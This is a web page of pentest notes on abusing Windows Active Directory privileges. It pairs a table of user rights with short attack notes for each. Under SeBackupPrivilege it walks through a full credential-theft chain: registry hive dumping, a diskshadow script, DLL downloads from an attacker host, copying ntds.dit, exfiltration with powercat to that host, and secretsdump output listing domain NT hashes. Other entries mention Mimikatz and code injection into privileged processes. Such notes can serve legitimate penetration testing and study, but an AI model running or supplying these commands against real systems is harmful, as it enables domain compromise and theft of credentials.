<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="readloud">
    
    <link rel="shortcut icon" href="../../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Privilegedaccountsandgroups - readloud.org</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Privileged Accounts and Groups in Active Directory", url: "#_top", children: [
              {title: "Your Best Friend", url: "#your-best-friend" },
              {title: "User Rights and Privileges", url: "#user-rights-and-privileges" },
              {title: "SePwnVector", url: "#sepwnvector" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    

    <h2 id="privileged-accounts-and-groups-in-active-directory">Privileged Accounts and Groups in Active Directory</h2>
<h3 id="your-best-friend">Your Best Friend</h3>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="n">whoami</span> <span class="p">/</span><span class="n">PRIV</span>
</span></code></pre></div>
<h3 id="user-rights-and-privileges">User Rights and Privileges</h3>
<table>
<thead>
<tr>
<th>User Right in Group Policy</th>
<th>Name of Constant</th>
</tr>
</thead>
<tbody>
<tr>
<td>Access Credential Manager as a trusted caller</td>
<td>SeTrustedCredManAccessPrivilege</td>
</tr>
<tr>
<td>Access this computer from the network</td>
<td>SeNetworkLogonRight</td>
</tr>
<tr>
<td>Act as part of the operating system</td>
<td>SeTcbPrivilege</td>
</tr>
<tr>
<td>Add workstations to domain</td>
<td>SeMachineAccountPrivilege</td>
</tr>
<tr>
<td>Adjust memory quotas for a process</td>
<td>SeIncreaseQuotaPrivilege</td>
</tr>
<tr>
<td>Allow log on locally</td>
<td>SeInteractiveLogonRight</td>
</tr>
<tr>
<td>Allow log on through Terminal Services</td>
<td>SeRemoteInteractiveLogonRight</td>
</tr>
<tr>
<td>Back up files and directories</td>
<td>SeBackupPrivilege</td>
</tr>
<tr>
<td>Bypass traverse checking</td>
<td>SeChangeNotifyPrivilege</td>
</tr>
<tr>
<td>Change the system time</td>
<td>SeSystemtimePrivilege</td>
</tr>
<tr>
<td>Change the time zone</td>
<td>SeTimeZonePrivilege</td>
</tr>
<tr>
<td>Create a pagefile</td>
<td>SeCreatePagefilePrivilege</td>
</tr>
<tr>
<td>Create a token object</td>
<td>SeCreateTokenPrivilege</td>
</tr>
<tr>
<td>Create global objects</td>
<td>SeCreateGlobalPrivilege</td>
</tr>
<tr>
<td>Create permanent shared objects</td>
<td>SeCreatePermanentPrivilege</td>
</tr>
<tr>
<td>Create symbolic links</td>
<td>SeCreateSymbolicLinkPrivilege</td>
</tr>
<tr>
<td>Debug programs</td>
<td>SeDebugPrivilege</td>
</tr>
<tr>
<td>Deny access to this computer from the network</td>
<td>SeDenyNetworkLogonRight</td>
</tr>
<tr>
<td>Deny log on as a batch job</td>
<td>SeDenyBatchLogonRight</td>
</tr>
<tr>
<td>Deny log on as a service</td>
<td>SeDenyServiceLogonRight</td>
</tr>
<tr>
<td>Deny log on locally</td>
<td>SeDenyInteractiveLogonRight</td>
</tr>
<tr>
<td>Deny log on through Terminal Services</td>
<td>SeDenyRemoteInteractiveLogonRight</td>
</tr>
<tr>
<td>Enable computer and user accounts to be trusted for delegation</td>
<td>SeEnableDelegationPrivilege</td>
</tr>
<tr>
<td>Force shutdown from a remote system</td>
<td>SeRemoteShutdownPrivilege</td>
</tr>
<tr>
<td>Generate security audits</td>
<td>SeAuditPrivilege</td>
</tr>
<tr>
<td>Impersonate a client after authentication</td>
<td>SeImpersonatePrivilege</td>
</tr>
<tr>
<td>Increase a process working set</td>
<td>SeIncreaseWorkingSetPrivilege</td>
</tr>
<tr>
<td>Increase scheduling priority</td>
<td>SeIncreaseBasePriorityPrivilege</td>
</tr>
<tr>
<td>Load and unload device drivers</td>
<td>SeLoadDriverPrivilege</td>
</tr>
<tr>
<td>Lock pages in memory</td>
<td>SeLockMemoryPrivilege</td>
</tr>
<tr>
<td>Log on as a batch job</td>
<td>SeBatchLogonRight</td>
</tr>
<tr>
<td>Log on as a service</td>
<td>SeServiceLogonRight</td>
</tr>
<tr>
<td>Manage auditing and security log</td>
<td>SeSecurityPrivilege</td>
</tr>
<tr>
<td>Modify an object label</td>
<td>SeRelabelPrivilege</td>
</tr>
<tr>
<td>Modify firmware environment values</td>
<td>SeSystemEnvironmentPrivilege</td>
</tr>
<tr>
<td>Perform volume maintenance tasks</td>
<td>SeManageVolumePrivilege</td>
</tr>
<tr>
<td>Profile single process</td>
<td>SeProfileSingleProcessPrivilege</td>
</tr>
<tr>
<td>Profile system performance</td>
<td>SeSystemProfilePrivilege</td>
</tr>
<tr>
<td>Remove computer from docking station</td>
<td>SeUndockPrivilege</td>
</tr>
<tr>
<td>Replace a process level token</td>
<td>SeAssignPrimaryTokenPrivilege</td>
</tr>
<tr>
<td>Restore files and directories</td>
<td>SeRestorePrivilege</td>
</tr>
<tr>
<td>Shut down the system</td>
<td>SeShutdownPrivilege</td>
</tr>
<tr>
<td>Synchronize directory service data</td>
<td>SeSyncAgentPrivilege</td>
</tr>
<tr>
<td>Take ownership of files or other objects</td>
<td>SeTakeOwnershipPrivilege</td>
</tr>
</tbody>
</table>
<hr />
<h3 id="sepwnvector">SePwnVector</h3>
<ul>
<li>
<h5 id="setrustedcredmanaccessprivilege">SeTrustedCredManAccessPrivilege</h5>
</li>
<li>
<h5 id="senetworklogonright">SeNetworkLogonRight</h5>
</li>
<li>
<h5 id="setcbprivilege">SeTcbPrivilege</h5>
<ul>
<li>S4U Logon<ul>
<li>Act as part of the operating system.</li>
<li>Allows a process to assume the identity of any user and thus gain access to the resources that the user is authorized to access.</li>
</ul>
</li>
<li>PTOKEN_GROUPS parameter in LsaLogonUser() can be modified <ul>
<li>The calling process may request that arbitrary additional accesses be put in the access token.</li>
</ul>
</li>
<li>Impersonate threads or processes</li>
</ul>
</li>
<li>
<h5 id="semachineaccountprivilege">SeMachineAccountPrivilege</h5>
</li>
<li>
<h5 id="seincreasequotaprivilege">SeIncreaseQuotaPrivilege</h5>
</li>
<li>
<h5 id="seinteractivelogonright">SeInteractiveLogonRight</h5>
</li>
<li>
<h5 id="seremoteinteractivelogonright">SeRemoteInteractiveLogonRight</h5>
</li>
<li>
<h5 id="sebackupprivilege">SeBackupPrivilege</h5>
<ul>
<li>Allows the user to circumvent file and directory permissions to backup the system. The privilege is selected only when the application attempts to access through the NTFS backup application interface. Otherwise normal file and directory permissions apply.‚Äù</li>
<li><code>reg save HKLM\SYSTEM c:\temp\system.hive</code></li>
<li><code>reg save HKLM\SAM c:\temp\sam.hive</code></li>
<li><code>secretsdump.py -sam sam.hive -system system.hive LOCAL</code></li>
<li>NinjaCopy</li>
<li>Abusing Backup Operators Group with shadow copy
    <div class="language-powershell highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c"># Create  script.txt file that will contain the shadow copy process script</span>
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="c">#Script -&gt;{</span>
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="nb">set </span><span class="n">context</span> <span class="n">persistent</span> <span class="n">nowriters</span>  
</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="nb">set </span><span class="n">metadata</span> <span class="n">c</span><span class="p">:\</span><span class="n">windows</span><span class="p">\</span><span class="n">system32</span><span class="p">\</span><span class="n">spool</span><span class="p">\</span><span class="n">drivers</span><span class="p">\</span><span class="n">color</span><span class="p">\</span><span class="n">example</span><span class="p">.</span><span class="n">cab</span>  
</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="nb">set </span><span class="n">verbose</span> <span class="n">on</span>  
</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="k">begin</span> <span class="n">backup</span>  
</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="n">add</span> <span class="n">volume</span> <span class="n">c</span><span class="p">:</span> <span class="k">alias</span> <span class="n">mydrive</span>  
</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>
</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="n">create</span>  
</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>
</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a><span class="n">expose</span> <span class="k">%</span><span class="n">mydrive</span><span class="p">%</span> <span class="n">w</span><span class="p">:</span>  
</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a><span class="k">end</span> <span class="n">backup</span>  
</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a><span class="c">#}</span>
</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>
</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a><span class="c"># TRANSFERT TO TARGET SYSTEM</span>
</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a><span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="s2">&quot;http://10.10.10.10/script.txt&quot;</span> <span class="n">-OutFile</span> <span class="s2">&quot;C:\\windows\\system32\\spool\\drivers\\color\\script.txt&quot;</span>
</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a>
</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a><span class="c"># EXEC DISKSHADOW</span>
</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a><span class="nb">cd </span><span class="n">C</span><span class="p">:\</span><span class="n">windows</span><span class="p">\</span><span class="n">system32</span><span class="p">\</span><span class="n">spool</span><span class="p">\</span><span class="n">drivers</span><span class="p">\</span><span class="n">color</span>
</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a><span class="n">diskshadow</span><span class="p">.</span><span class="n">exe</span> <span class="n">-s</span> <span class="n">script</span><span class="p">.</span><span class="n">txt</span>
</span><span id="__span-1-21"><a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a>
</span><span id="__span-1-22"><a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a><span class="c"># CHECK THE CAB</span>
</span><span id="__span-1-23"><a id="__codelineno-1-23" name="__codelineno-1-23" href="#__codelineno-1-23"></a><span class="nb">ls</span>
</span><span id="__span-1-24"><a id="__codelineno-1-24" name="__codelineno-1-24" href="#__codelineno-1-24"></a><span class="n">-a</span><span class="p">----</span>         <span class="n">6</span><span class="p">/</span><span class="n">7</span><span class="p">/</span><span class="n">2020</span>   <span class="n">9</span><span class="p">:</span><span class="n">31</span> <span class="n">PM</span>            <span class="n">743</span> <span class="n">example</span><span class="p">.</span><span class="n">cab</span>
</span><span id="__span-1-25"><a id="__codelineno-1-25" name="__codelineno-1-25" href="#__codelineno-1-25"></a>
</span><span id="__span-1-26"><a id="__codelineno-1-26" name="__codelineno-1-26" href="#__codelineno-1-26"></a><span class="c"># IMPORTING DLL SeBackupPrivilegeCmdLets &amp; SeBackupPrivilegeUtils</span>
</span><span id="__span-1-27"><a id="__codelineno-1-27" name="__codelineno-1-27" href="#__codelineno-1-27"></a><span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="s2">&quot;http://10.10.10.10/SeBackupPrivilegeCmdLets.dll&quot;</span> <span class="n">-OutFile</span> <span class="s2">&quot;C:\\windows\\system32\\spool\\drivers\\color\\SeBackupPrivilegeCmdLets.dll&quot;</span>
</span><span id="__span-1-28"><a id="__codelineno-1-28" name="__codelineno-1-28" href="#__codelineno-1-28"></a><span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="s2">&quot;http://10.10.10.10/SeBackupPrivilegeUtils.dll&quot;</span> <span class="n">-OutFile</span> <span class="s2">&quot;C:\\windows\\system32\\spool\\drivers\\color\\SeBackupPrivilegeUtils.dll&quot;</span>
</span><span id="__span-1-29"><a id="__codelineno-1-29" name="__codelineno-1-29" href="#__codelineno-1-29"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">SeBackupPrivilegeCmdLets</span><span class="p">.</span><span class="n">dll</span>
</span><span id="__span-1-30"><a id="__codelineno-1-30" name="__codelineno-1-30" href="#__codelineno-1-30"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">SeBackupPrivilegeUtils</span><span class="p">.</span><span class="n">dll</span>
</span><span id="__span-1-31"><a id="__codelineno-1-31" name="__codelineno-1-31" href="#__codelineno-1-31"></a>
</span><span id="__span-1-32"><a id="__codelineno-1-32" name="__codelineno-1-32" href="#__codelineno-1-32"></a><span class="c"># CHECK MODULE</span>
</span><span id="__span-1-33"><a id="__codelineno-1-33" name="__codelineno-1-33" href="#__codelineno-1-33"></a><span class="nb">get-help</span> <span class="n">SeBackupPrivilege</span>
</span><span id="__span-1-34"><a id="__codelineno-1-34" name="__codelineno-1-34" href="#__codelineno-1-34"></a><span class="n">Name</span>                              <span class="n">Category</span>  <span class="n">Module</span>                    <span class="n">Synopsis</span>
</span><span id="__span-1-35"><a id="__codelineno-1-35" name="__codelineno-1-35" href="#__codelineno-1-35"></a><span class="p">----</span>                              <span class="p">--------</span>  <span class="p">------</span>                    <span class="p">--------</span>
</span><span id="__span-1-36"><a id="__codelineno-1-36" name="__codelineno-1-36" href="#__codelineno-1-36"></a><span class="nb">Get-SeBackupPrivilege</span>             <span class="n">Cmdlet</span>    <span class="n">SeBackupPrivilegeCmdLets</span>  <span class="p">...</span>
</span><span id="__span-1-37"><a id="__codelineno-1-37" name="__codelineno-1-37" href="#__codelineno-1-37"></a><span class="nb">Set-SeBackupPrivilege</span>             <span class="n">Cmdlet</span>    <span class="n">SeBackupPrivilegeCmdLets</span>  <span class="p">...</span>
</span><span id="__span-1-38"><a id="__codelineno-1-38" name="__codelineno-1-38" href="#__codelineno-1-38"></a><span class="nb">Copy-FileSeBackupPrivilege</span>        <span class="n">Cmdlet</span>    <span class="n">SeBackupPrivilegeCmdLets</span>  <span class="p">...</span>
</span><span id="__span-1-39"><a id="__codelineno-1-39" name="__codelineno-1-39" href="#__codelineno-1-39"></a>
</span><span id="__span-1-40"><a id="__codelineno-1-40" name="__codelineno-1-40" href="#__codelineno-1-40"></a><span class="c">#Use the functionality of the dlls to copy the ntds.dit database file from the shadow copy to a location of our choice</span>
</span><span id="__span-1-41"><a id="__codelineno-1-41" name="__codelineno-1-41" href="#__codelineno-1-41"></a><span class="nb">Copy-FileSeBackupPrivilege</span> <span class="n">w</span><span class="p">:\</span><span class="n">windows</span><span class="p">\</span><span class="n">NTDS</span><span class="p">\</span><span class="n">ntds</span><span class="p">.</span><span class="n">dit</span> <span class="n">c</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">temp</span><span class="p">\</span><span class="n">ntds</span><span class="p">.</span><span class="n">dit</span> <span class="n">-Overwrite</span>
</span><span id="__span-1-42"><a id="__codelineno-1-42" name="__codelineno-1-42" href="#__codelineno-1-42"></a>
</span><span id="__span-1-43"><a id="__codelineno-1-43" name="__codelineno-1-43" href="#__codelineno-1-43"></a><span class="c"># Dump ACTUAL SYSTEM hive</span>
</span><span id="__span-1-44"><a id="__codelineno-1-44" name="__codelineno-1-44" href="#__codelineno-1-44"></a><span class="n">reg</span><span class="p">.</span><span class="n">exe</span> <span class="n">save</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">SYSTEM</span> <span class="n">c</span><span class="p">:\</span><span class="n">temp</span><span class="p">\</span><span class="n">system</span><span class="p">.</span><span class="n">hive</span> 
</span><span id="__span-1-45"><a id="__codelineno-1-45" name="__codelineno-1-45" href="#__codelineno-1-45"></a>
</span><span id="__span-1-46"><a id="__codelineno-1-46" name="__codelineno-1-46" href="#__codelineno-1-46"></a><span class="c"># FILE TRANSFERT</span>
</span><span id="__span-1-47"><a id="__codelineno-1-47" name="__codelineno-1-47" href="#__codelineno-1-47"></a><span class="n">powercat</span> <span class="n">-c</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-p</span> <span class="n">443</span> <span class="n">-i</span> <span class="n">c</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">temp</span><span class="p">\</span><span class="n">system</span><span class="p">.</span><span class="n">hive</span>
</span><span id="__span-1-48"><a id="__codelineno-1-48" name="__codelineno-1-48" href="#__codelineno-1-48"></a><span class="n">powercat</span> <span class="n">-c</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-p</span> <span class="n">443</span> <span class="n">-i</span> <span class="n">c</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">temp</span><span class="p">\</span><span class="n">ntds</span><span class="p">.</span><span class="n">dit</span>
</span><span id="__span-1-49"><a id="__codelineno-1-49" name="__codelineno-1-49" href="#__codelineno-1-49"></a>
</span><span id="__span-1-50"><a id="__codelineno-1-50" name="__codelineno-1-50" href="#__codelineno-1-50"></a><span class="c"># REBUILD AD HASHES</span>
</span><span id="__span-1-51"><a id="__codelineno-1-51" name="__codelineno-1-51" href="#__codelineno-1-51"></a><span class="n">secretsdump</span><span class="p">.</span><span class="n">py</span> <span class="n">-ntds</span> <span class="n">ntds</span><span class="p">.</span><span class="n">dit</span> <span class="n">-system</span> <span class="n">system</span><span class="p">.</span><span class="n">hive</span> <span class="n">LOCAL</span>
</span><span id="__span-1-52"><a id="__codelineno-1-52" name="__codelineno-1-52" href="#__codelineno-1-52"></a><span class="n">Impacket</span> <span class="n">v0</span><span class="p">.</span><span class="n">9</span><span class="p">.</span><span class="n">21</span><span class="p">.</span><span class="n">dev1</span><span class="p">+</span><span class="n">20200313</span><span class="p">.</span><span class="n">160519</span><span class="p">.</span><span class="n">0056b61c</span> <span class="p">-</span> <span class="n">Copyright</span> <span class="n">2020</span> <span class="n">SecureAuth</span> <span class="n">Corporation</span>
</span><span id="__span-1-53"><a id="__codelineno-1-53" name="__codelineno-1-53" href="#__codelineno-1-53"></a>
</span><span id="__span-1-54"><a id="__codelineno-1-54" name="__codelineno-1-54" href="#__codelineno-1-54"></a><span class="p">[*]</span> <span class="n">Target</span> <span class="n">system</span> <span class="n">bootKey</span><span class="p">:</span> <span class="n">0x73d83e56de8961ca9f243e1a49638393</span>
</span><span id="__span-1-55"><a id="__codelineno-1-55" name="__codelineno-1-55" href="#__codelineno-1-55"></a><span class="p">[*]</span> <span class="n">Dumping</span> <span class="n">Domain</span> <span class="n">Credentials</span> <span class="p">(</span><span class="n">domain</span><span class="p">\</span><span class="n">uid</span><span class="p">:</span><span class="n">rid</span><span class="p">:</span><span class="n">lmhash</span><span class="p">:</span><span class="n">nthash</span><span class="p">)</span>
</span><span id="__span-1-56"><a id="__codelineno-1-56" name="__codelineno-1-56" href="#__codelineno-1-56"></a><span class="p">[*]</span> <span class="n">Searching</span> <span class="k">for</span> <span class="n">pekList</span><span class="p">,</span> <span class="n">be</span> <span class="n">patient</span>
</span><span id="__span-1-57"><a id="__codelineno-1-57" name="__codelineno-1-57" href="#__codelineno-1-57"></a><span class="p">[*]</span> <span class="n">PEK</span> <span class="c"># 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c</span>
</span><span id="__span-1-58"><a id="__codelineno-1-58" name="__codelineno-1-58" href="#__codelineno-1-58"></a><span class="p">[*]</span> <span class="n">Reading</span> <span class="n">and</span> <span class="n">decrypting</span> <span class="n">hashes</span> <span class="n">from</span> <span class="n">ntds</span><span class="p">.</span><span class="n">dit</span> 
</span><span id="__span-1-59"><a id="__codelineno-1-59" name="__codelineno-1-59" href="#__codelineno-1-59"></a><span class="n">Administrator</span><span class="p">:</span><span class="n">500</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">184fb5e5178480be64824d4cd53b99ee</span><span class="p">:::</span>
</span><span id="__span-1-60"><a id="__codelineno-1-60" name="__codelineno-1-60" href="#__codelineno-1-60"></a><span class="n">Guest</span><span class="p">:</span><span class="n">501</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">31d6cfe0d16ae931b73c59d7e0c089c0</span><span class="p">:::</span>
</span><span id="__span-1-61"><a id="__codelineno-1-61" name="__codelineno-1-61" href="#__codelineno-1-61"></a><span class="n">DC01</span><span class="p">$:</span><span class="n">1000</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">65557f7ad03ac340a7eb12b9462f80d6</span><span class="p">:::</span>
</span><span id="__span-1-62"><a id="__codelineno-1-62" name="__codelineno-1-62" href="#__codelineno-1-62"></a><span class="n">krbtgt</span><span class="p">:</span><span class="n">502</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">d3c02561bba6ee4ad6cfd024ec8fda5d</span><span class="p">:::</span>
</span><span id="__span-1-63"><a id="__codelineno-1-63" name="__codelineno-1-63" href="#__codelineno-1-63"></a><span class="p">...</span>
</span></code></pre></div></li>
<li>If you have SeBackup &amp; SeRestoreprivileges(Backup Operators group) you can set permission and ownership on each file &amp; folder.</li>
</ul>
</li>
<li>
<h5 id="sechangenotifyprivilege">SeChangeNotifyPrivilege</h5>
</li>
<li>
<h5 id="sesystemtimeprivilege">SeSystemtimePrivilege</h5>
</li>
<li>
<h5 id="setimezoneprivilege">SeTimeZonePrivilege</h5>
</li>
<li>
<h5 id="secreatepagefileprivilege">SeCreatePagefilePrivilege</h5>
</li>
<li>
<h5 id="secreatetokenprivilege">SeCreateTokenPrivilege</h5>
<ul>
<li>Allows a process to create an access token by calling token-creating APIs.</li>
<li>Create a custom token with all privileges and group membership.</li>
</ul>
</li>
<li>
<h5 id="secreateglobalprivilege">SeCreateGlobalPrivilege</h5>
</li>
<li>
<h5 id="secreatepermanentprivilege">SeCreatePermanentPrivilege</h5>
</li>
<li>
<h5 id="secreatesymboliclinkprivilege">SeCreateSymbolicLinkPrivilege</h5>
</li>
<li>
<h5 id="sedebugprivilege">SeDebugPrivilege</h5>
<ul>
<li>Create a new process and set the parent process a privileged process.</li>
<li>Allows the holder to debug another process.</li>
<li>Permits read/write memory and change properties of any process (including Local System, administrator...) </li>
<li>Load Mimikatz.</li>
<li>Inject code into privileged processes in order to perform privileged tasks (VirtualAlloc(), WriteProcessMemory(), CreateRemoteThread(),...)</li>
</ul>
</li>
<li>
<h5 id="sedenynetworklogonright">SeDenyNetworkLogonRight</h5>
</li>
<li>
<h5 id="sedenybatchlogonright">SeDenyBatchLogonRight</h5>
</li>
<li>
<h5 id="sedenyservicelogonright">SeDenyServiceLogonRight</h5>
</li>
<li>
<h5 id="sedenyinteractivelogonright">SeDenyInteractiveLogonRight</h5>
</li>
<li>
<h5 id="sedenyremoteinteractivelogonright">SeDenyRemoteInteractiveLogonRight</h5>
</li>
<li>
<h5 id="seenabledelegationprivilege">SeEnableDelegationPrivilege</h5>
</li>
<li>
<h5 id="seremoteshutdownprivilege">SeRemoteShutdownPrivilege</h5>
</li>
<li>
<h5 id="seauditprivilege">SeAuditPrivilege</h5>
</li>
<li>
<h5 id="seimpersonateprivilege">SeImpersonatePrivilege</h5>
</li>
<li>
<h5 id="seincreaseworkingsetprivilege">SeIncreaseWorkingSetPrivilege</h5>
</li>
<li>
<h5 id="seincreasebasepriorityprivilege">SeIncreaseBasePriorityPrivilege</h5>
</li>
<li>
<h5 id="seloaddriverprivilege">SeLoadDriverPrivilege</h5>
</li>
<li>
<h5 id="selockmemoryprivilege">SeLockMemoryPrivilege</h5>
</li>
<li>
<h5 id="sebatchlogonright">SeBatchLogonRight</h5>
</li>
<li>
<h5 id="seservicelogonright">SeServiceLogonRight</h5>
</li>
<li>
<h5 id="sesecurityprivilege">SeSecurityPrivilege</h5>
</li>
<li>
<h5 id="serelabelprivilege">SeRelabelPrivilege</h5>
</li>
<li>
<h5 id="sesystemenvironmentprivilege">SeSystemEnvironmentPrivilege</h5>
</li>
<li>
<h5 id="semanagevolumeprivilege">SeManageVolumePrivilege</h5>
</li>
<li>
<h5 id="seprofilesingleprocessprivilege">SeProfileSingleProcessPrivilege</h5>
</li>
<li>
<h5 id="sesystemprofileprivilege">SeSystemProfilePrivilege</h5>
</li>
<li>
<h5 id="seundockprivilege">SeUndockPrivilege</h5>
</li>
<li>
<h5 id="seassignprimarytokenprivilege">SeAssignPrimaryTokenPrivilege</h5>
</li>
<li>
<h5 id="serestoreprivilege">SeRestorePrivilege</h5>
<ul>
<li>Allows a user to circumvent file and directory permissions when restoring backed-up files and directories‚Äú (but also registry keys)</li>
<li>Can write files anywhere, overwrites files, protected system files - even those protected by TrustedInstaller, registry entries...</li>
<li>Create a Service DLL.</li>
<li>Overwrite Service config in Registry</li>
</ul>
</li>
<li>
<h5 id="seshutdownprivilege">SeShutdownPrivilege</h5>
</li>
<li>
<h5 id="sesyncagentprivilege">SeSyncAgentPrivilege</h5>
</li>
<li>
<h5 id="setakeownershipprivilege">SeTakeOwnershipPrivilege</h5>
<ul>
<li>Allows the user to take ownership of any securable object in the system.</li>
<li>(SE_OBJECT_TYPE): Files, Printers, Shares, Services, Registry, Kernel objects...</li>
<li>SeRestorePrivilege apply.</li>
<li>Change Permissions on Registry Key.</li>
</ul>
</li>
</ul>

  <br>
    

    <br>
</div>

<footer class="col-md-12 wm-page-content">
      <p>
        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/explore/resource/privilegedaccountsandgroups.md"><i class="fa fa-github"></i>
Edit on GitHub</a>
      </p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
<p>        ‚ö†Ô∏è The quieter you become, the more you are able to hear ü•∑</p>
</footer>

</body>
</html>